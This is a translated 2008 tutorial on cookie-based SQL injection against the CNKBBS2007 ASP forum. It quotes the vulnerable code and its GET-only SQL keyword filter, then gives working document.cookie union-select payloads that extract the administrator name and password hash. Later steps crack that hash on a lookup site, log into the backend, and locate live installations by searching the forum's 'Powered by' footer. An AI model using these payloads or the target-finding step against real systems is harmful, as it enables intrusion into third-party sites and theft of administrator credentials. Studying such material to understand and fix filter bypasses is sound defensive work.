Injection methods and principles of cookies

by xloong on 2008-05-31 21:36:52

Nowadays, many websites have adopted universal SQL injection prevention programs. Does this mean we are helpless against such websites? The answer is no, because we can use cookie injection methods, and many universal SQL injection prevention programs do not guard against this type of injection.

Before we proceed, let's review the knowledge about Request objects in ASP scripts. In the previous sections, we mentioned that the Request object commonly uses two ways to obtain data submitted by clients: GET and POST. At the same time, the Request object can obtain data without using a collection, i.e., directly using "request('name')", but this method has low efficiency and is prone to errors. When we omit the specific collection name, ASP searches in the order of QueryString, Form, Cookie, ServerVariable collections. Among the members of the Request object, there is a collection called Cookies, which means "read all cookie values sent by the user system." From the second section on "Cookie Spoofing Intrusion and Principles," we know that cookies are text files stored on client computers and can be modified. Thus, we can use the Request.cookie method to submit variable values and exploit system vulnerabilities for injection attacks.

First, let's look at the latest version of Zhongwang Jing Forum "(CNKBBS2007) Zhongwang Jing Forum 2007v5.0" with the official download address "http://www.cnetking.com/websys2.asp?id=26". It was released on June 6, 2007. After opening the system source code, in the file "user_RxMsg_detail.asp", we find the following code:

```html

(call opendb.asp file)

"" then Call IsNum(bid) (This is where the programmer made a mistake, note that bid<>id)

conn.execute("update cnk_Users_RxMsg set readed=1 where id="&id) 'set as read

rs.open "select * from cnk_users_RxMsg where id="&id,conn,1,3

```

Let's open the "opendb.asp" file:

```html

(call fzr.asp file)

```

It is clear that this is a database connection file, which calls the fzr.asp file. Let's open the fzr.asp file:

```html

"" Then (check data submitted by the client using GET method, without specifying checks for other submission methods)

'Customize strings to filter, separated by "|"

Fy_In = "'|;|%|*|and|exec|insert|select|delete|update|count|chr|mid|master|truncate|char|declare|script" (blocks commonly used SQL injection statements)

Fy_Inf = split(Fy_In,"|")

For Each Fy_Get In Request.QueryString

For Fy_Xh=0 To Ubound(Fy_Inf)

If Instr(LCase(Request.QueryString(Fy_Get)),Fy_Inf(Fy_Xh))<>0 Then

zruserip=Request.ServerVariables("HTTP_X_FORWARDED_FOR")

If zruserip="" Then zruserip=Request.ServerVariables("REMOTE_ADDR")

Response.Write "Content contains illegal characters! Do not include ' or and or or etc. Please remove these characters before submitting!!"

Response.Write "If you are attacking the website, your operation has been recorded ↓"

Response.Write "Operation IP:"&zruserip&""

Response.Write "Operation Time:"&Now&""

Response.Write "Operation Page:"&Request.ServerVariables("URL")&""

Response.Write "Submission Method: GET"

Response.Write "Submission Parameter:"&Fy_Get&""

Response.Write "Submission Data:"&Request.QueryString(Fy_Get)

```

Clearly, it is a SQL universal injection prevention program file. (The red text above explains the code.)

After reviewing the code, let's organize our thoughts: Due to the programmer's error, the id was not filtered before being brought into the SQL statement for querying, which caused the injection vulnerability. Although the program introduced an injection prevention program that blocked the use of common SQL statements, it only judged data submitted by the client using the GET method and did not judge data submitted by other methods. This allowed the client to use the Request.cookie method to submit variable values and bypass the SQL injection prevention program. (Summary: Conditions for cookie injection: The system directly uses "request('name')" to obtain data submitted by the client without filtering the variables submitted by the client. Moreover, the injection prevention program does not restrict Request.cookie. The current injection prevention program 3.0 only limits GET and POST submission methods.)

Now that we understand the principle, let's learn some cookie injection statements:

Cookie injection statement: `alert(document.cookie="id="+escape("this is what xx represents after asp?id=xx") and (this is the injection attack code)"))`;

Here, we use JavaScript language knowledge. I will break down the meaning of this statement for better understanding:

1. `alert()`: A method that displays an information dialog box, generating a standalone small window called a dialog box to display a message and a button. (We often use it in cross-site scripting.)

2. `document.cookie`: When handling cookies, JavaScript saves them as an attribute of the document object, with the attribute name being cookie. Using this attribute, we can create and read cookie data. In the program, we can use `alert(document.cookie)` to call the value of the current page's cookie data items. After starting the browser and opening a page, if the corresponding cookies exist, they are loaded into the cookie attribute of the document object. The document.cookie attribute saves each cookie data item value in the form of name=value pairs. The document (document) object represents the HTML displayed in the browser (outputting data to the page), and the cookie attribute allows reading and writing HTTP cookies; string type.

4. `escape()` function: It converts all non-alphabetic characters in the string into equivalent alphanumeric strings, having the function of encoding strings. Generally, cookies are usually sent to the browser by server-side programs through HTTP request and response headers, but using JavaScript, cookies can be set in the local browser.

Format: The attributes of the name=value pair specify the name of the cookie data item, and value is the corresponding value of that name, which is a string or a series of characters. Neither name nor value can contain semicolons, commas, or blanks. Since (50"and 1=1") contains semicolons, commas, and blanks, we need to use the `escape()` function to encode them.

Everyone should now understand the entire sentence, which sets and calls the current created cookie data item value. When setting cookies, they are first saved in the browser's memory and written to the hard disk when exiting the browser. (This is why we need to exit and re-enter the link address in the subsequent operations.)

Finally, let's test it with the following steps:

1. Open the locally set up Zhongwang Jing Forum: Register a user, and we will receive a short message from the administrator. Open the link of the short message (pay attention to the parameter id value here).

2. Clear the browser's URL, input `alert(document.cookie="id="+escape("corresponding parameter id value and 1=1"))`; a box will pop up.

3. Input again: `http://127.0.0.1/cnkbbs5.2_ac/user_RxMsg_detail.asp?username=forum admin` (returns a normal page, indicating that we have bypassed the SQL injection prevention program).

4. Input again: `alert(document.cookie="id="+escape("1 and 1=2"))`; then input: `http://127.0.0.1/cnkbbs5.2_ac/user_RxMsg_detail.asp?username=forum admin` (neither time nor content is displayed, indicating that we can perform injection).

5. By checking the system database, we know that the cnk_users_RxMsg table has 8 fields, and the Cnk_Admin table stores administrator information, where AdminName and AdminPassword correspond to the account and password respectively. We use a union query statement and input: `alert(document.cookie="id="+escape("1 and 1=2 union select 1,2,3,4,5,6,7,8 from Cnk_Admin"))`. Then clear the address bar and input `http://127.0.0.1/cnkbbs5.2_ac/user_RxMsg_detail.asp`, and we can see the numbers 4 and 5 displayed.

6. Clear the address bar again, input: `alert(document.cookie="id="+escape("1 and 1=2 union select 1,2,3,AdminName,AdminPassword,6,7,8 from Cnk_Admin"))`, submit, clear the address bar, and input: `http://127.0.0.1/cnkbbs5.2_ac/user_RxMsg_detail.asp?username=forum admin`. This way, we can see the administrator's password and account on the page.

7. Put the obtained password into the http://www.cmd5.com website to query, and we find out that the plaintext password of the administrator is admin. On the homepage of the website, we can log in to the backend. We can also use the keyword "Powered by CNKBBS2007 (5.2)" to search for websites using this system online (though there aren't many). Practice manual injection, but don't cause destruction! However, when using this type of injection, it requires two manual operations to complete, which is an easy place to make mistakes, so be careful.
